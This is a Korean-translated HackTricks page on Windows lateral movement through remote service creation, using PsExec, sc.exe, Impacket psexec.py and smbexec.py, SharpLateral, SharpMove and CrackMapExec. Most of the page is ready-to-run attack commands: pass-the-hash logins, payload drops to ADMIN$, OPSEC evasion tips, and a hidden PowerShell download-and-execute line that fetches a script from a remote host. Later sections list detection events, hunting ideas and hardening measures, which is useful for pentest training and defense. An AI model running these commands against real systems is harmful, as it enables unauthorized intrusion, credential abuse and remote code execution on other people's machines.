# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## How do they work

이 기술들은 SMB/RPC를 통해 원격으로 Windows Service Control Manager (SCM)를 악용하여 대상 호스트에서 명령을 실행합니다. 일반적인 흐름은 다음과 같습니다:

1. 대상에 인증하고 SMB (TCP/445)를 통해 ADMIN$ 공유에 접근합니다.
2. 실행 파일을 복사하거나 서비스가 실행할 LOLBAS 명령줄을 지정합니다.
3. 해당 명령이나 바이너리를 가리키는 SCM (MS-SCMR over \PIPE\svcctl)을 통해 원격으로 서비스를 생성합니다.
4. 페이로드를 실행하기 위해 서비스를 시작하고 선택적으로 명명된 파이프를 통해 stdin/stdout을 캡처합니다.
5. 서비스를 중지하고 정리합니다 (서비스 및 드롭된 바이너리를 삭제).

Requirements/prereqs:
- 대상에서 로컬 관리자 권한 (SeCreateServicePrivilege) 또는 명시적인 서비스 생성 권한.
- SMB (445)에 접근 가능하고 ADMIN$ 공유가 사용 가능; 호스트 방화벽을 통해 원격 서비스 관리 허용.
- UAC 원격 제한: 로컬 계정의 경우, 토큰 필터링이 네트워크를 통한 관리자를 차단할 수 있으며, 내장된 관리자 또는 LocalAccountTokenFilterPolicy=1을 사용해야 합니다.
- Kerberos vs NTLM: 호스트 이름/FQDN을 사용하면 Kerberos가 활성화되고, IP로 연결할 경우 NTLM으로 되돌아가는 경우가 많으며 (강화된 환경에서는 차단될 수 있음).

### Manual ScExec/WinExec via sc.exe

다음은 최소한의 서비스 생성 접근 방식을 보여줍니다. 서비스 이미지는 드롭된 EXE 또는 cmd.exe 또는 powershell.exe와 같은 LOLBAS일 수 있습니다.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
노트:
- 비서비스 EXE를 시작할 때 타임아웃 오류가 발생할 수 있습니다. 실행은 여전히 발생합니다.
- OPSEC 친화성을 유지하기 위해 파일 없는 명령(cmd /c, powershell -enc)을 선호하거나 드롭된 아티팩트를 삭제하세요.

자세한 단계는 다음에서 확인하세요: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

## 도구 및 예제

### Sysinternals PsExec.exe

- SMB를 사용하여 ADMIN$에 PSEXESVC.exe를 드롭하고, 임시 서비스를 설치하며(기본 이름 PSEXESVC), 명명된 파이프를 통해 I/O를 프록시하는 고전적인 관리 도구입니다.
- 사용 예:
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- WebDAV를 통해 Sysinternals Live에서 직접 실행할 수 있습니다:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- 서비스 설치/제거 이벤트를 남기며 (서비스 이름은 -r이 사용되지 않는 한 종종 PSEXESVC) 실행 중 C:\Windows\PSEXESVC.exe를 생성합니다.

### Impacket psexec.py (PsExec 유사)

- 임베디드 RemCom 유사 서비스를 사용합니다. ADMIN$를 통해 임시 서비스 바이너리(일반적으로 무작위 이름)를 드롭하고, 서비스를 생성하며(기본적으로 종종 RemComSvc), 명명된 파이프를 통해 I/O를 프록시합니다.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
아티팩트
- C:\Windows\에 임시 EXE (무작위 8자). 서비스 이름은 재정의되지 않는 한 기본적으로 RemComSvc입니다.

### Impacket smbexec.py (SMBExec)

- cmd.exe를 생성하고 I/O를 위해 명명된 파이프를 사용하는 임시 서비스를 생성합니다. 일반적으로 전체 EXE 페이로드를 드롭하는 것을 피하며, 명령 실행은 반대화적입니다.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral 및 SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#)는 서비스 기반 exec를 포함한 여러 측면 이동 방법을 구현합니다.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove)는 원격으로 명령을 실행하기 위한 서비스 수정/생성을 포함합니다.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- CrackMapExec를 사용하여 다양한 백엔드를 통해 실행할 수도 있습니다 (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, 탐지 및 아티팩트

PsExec와 유사한 기술을 사용할 때의 전형적인 호스트/네트워크 아티팩트:
- 보안 4624 (로그온 유형 3) 및 4672 (특수 권한)에서 사용된 관리 계정에 대한 대상.
- 보안 5140/5145 파일 공유 및 파일 공유 세부 이벤트에서 ADMIN$ 접근 및 서비스 바이너리 생성/쓰기 (예: PSEXESVC.exe 또는 임의의 8자 .exe).
- 대상에서 보안 7045 서비스 설치: PSEXESVC, RemComSvc 또는 사용자 정의 (-r / -service-name)와 같은 서비스 이름.
- Sysmon 1 (프로세스 생성) 서비스.exe 또는 서비스 이미지, 3 (네트워크 연결), 11 (파일 생성) C:\Windows\에서, 17/18 (파이프 생성/연결) \\.\pipe\psexesvc, \\.\pipe\remcom_* 또는 무작위 동등물에 대한 파이프.
- Sysinternals EULA에 대한 레지스트리 아티팩트: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 운영자 호스트에서 (억제되지 않은 경우).

사냥 아이디어
- ImagePath에 cmd.exe /c, powershell.exe 또는 TEMP 위치가 포함된 서비스 설치에 대한 경고.
- ParentImage가 C:\Windows\PSEXESVC.exe인 프로세스 생성 또는 LOCAL SYSTEM으로 실행되는 services.exe의 자식 찾기.
- -stdin/-stdout/-stderr로 끝나는 명명된 파이프 또는 잘 알려진 PsExec 클론 파이프 이름 플래그 지정.

## 일반적인 실패 문제 해결
- 서비스 생성 시 액세스 거부 (5): 실제 로컬 관리자가 아님, 로컬 계정에 대한 UAC 원격 제한 또는 서비스 바이너리 경로에 대한 EDR 변조 방지.
- 네트워크 경로를 찾을 수 없음 (53) 또는 ADMIN$에 연결할 수 없음: SMB/RPC 차단 방화벽 또는 관리 공유 비활성화.
- Kerberos 실패하지만 NTLM 차단됨: 호스트 이름/FQDN (IP 아님)을 사용하여 연결, 적절한 SPN 보장 또는 Impacket 사용 시 티켓과 함께 -k/-no-pass 제공.
- 서비스 시작 시간이 초과되지만 페이로드가 실행됨: 실제 서비스 바이너리가 아닐 경우 예상; 출력을 파일로 캡처하거나 smbexec를 사용하여 실시간 I/O.

## 강화 노트
- Windows 11 24H2 및 Windows Server 2025는 기본적으로 아웃바운드 (및 Windows 11 인바운드) 연결에 대해 SMB 서명을 요구합니다. 이는 유효한 자격 증명을 가진 합법적인 PsExec 사용을 방해하지 않지만 서명되지 않은 SMB 릴레이 남용을 방지하고 서명을 지원하지 않는 장치에 영향을 미칠 수 있습니다.
- 새로운 SMB 클라이언트 NTLM 차단 (Windows 11 24H2/Server 2025)은 IP로 연결하거나 비-Kerberos 서버에 연결할 때 NTLM 폴백을 방지할 수 있습니다. 강화된 환경에서는 NTLM 기반 PsExec/SMBExec가 중단되며, Kerberos (호스트 이름/FQDN)를 사용하거나 합법적으로 필요할 경우 예외를 구성해야 합니다.
- 최소 권한 원칙: 로컬 관리자 멤버십 최소화, Just-in-Time/Just-Enough Admin 선호, LAPS 시행, 7045 서비스 설치 모니터링/경고.

## 참조

- WMI 기반 원격 실행 (종종 더 파일리스):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM 기반 원격 실행:

{{#ref}}
./winrm.md
{{#endref}}



## 참고 문헌

- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
- Windows Server 2025 및 Windows 11의 SMB 보안 강화 (기본적으로 서명, NTLM 차단): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591

{{#include ../../banners/hacktricks-training.md}}
